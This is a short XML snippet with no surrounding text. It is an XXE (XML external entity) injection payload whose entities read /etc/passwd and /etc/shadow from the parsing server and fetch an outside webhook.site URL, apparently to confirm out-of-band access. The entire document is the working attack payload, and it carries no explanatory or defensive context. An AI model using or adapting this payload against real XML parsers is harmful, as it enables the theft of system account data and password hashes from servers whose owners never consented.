```
<!DOCTYPE test [
<!ENTITY newfrom "VULNERABLE3">
<!ENTITY ent SYSTEM "file:///etc/passwd">
<!ENTITY ent2 SYSTEM "file:///etc/shadow">
<!ENTITY test SYSTEM "https://webhook.site/...;">
]>

<test>&newfrom;</test>
<test>&ent;</test>
<test>&ent2;</test>
<test>&test;</test>
```